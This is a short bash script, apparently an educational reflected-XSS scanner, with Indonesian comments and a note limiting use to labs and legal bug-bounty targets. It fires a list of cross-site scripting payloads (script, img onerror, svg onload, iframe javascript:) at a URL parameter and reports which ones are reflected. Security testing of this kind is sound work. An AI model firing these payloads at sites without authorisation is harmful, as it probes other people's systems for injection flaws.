#!/bin/bash
# =====================================
#  XSS Scanner Mini (Educational Only)
#  Author : d4nu-ghost
#  NOTE   : Gunakan hanya di lab / target legal (bug bounty, test sendiri)
# =====================================

if [ $# -ne 1 ]; then
  echo "Usage: $0 <url-with-parameter>"
  echo "Example: $0 'http://127.0.0.1/vuln.php?q='"
  exit 1
fi

URL=$1

# Koleksi payload dasar
PAYLOADS=(
  "<script>alert(d4nu-ghost)</script>"
  "\"><script>alert(d4nu-ghost)</script>"
  "'\"><img src=x onerror=alert(d4nu-ghost)>"
  "<svg/onload=alert(d4nu-ghost)>"
  "<body onload=alert(d4nu-ghost)>"
  "';alert(1);//"
  "<iframe src=javascript:alert(d4nu-ghost)>"
)

echo "🎯 Target: $URL"
echo "⚡ Mulai scanning XSS..."
echo ""

for p in "${PAYLOADS[@]}"; do
  echo "🔹 Testing payload: $p"
  RESPONSE=$(curl -s -L "${URL}${p}")

  if echo "$RESPONSE" | grep -q "$p"; then
    echo "✅ POTENSI XSS dengan payload: $p"
  else
    echo "❌ Tidak refleksi."
  fi
  echo "----------------------------------"
done

echo "🎉 Selesai scanning."
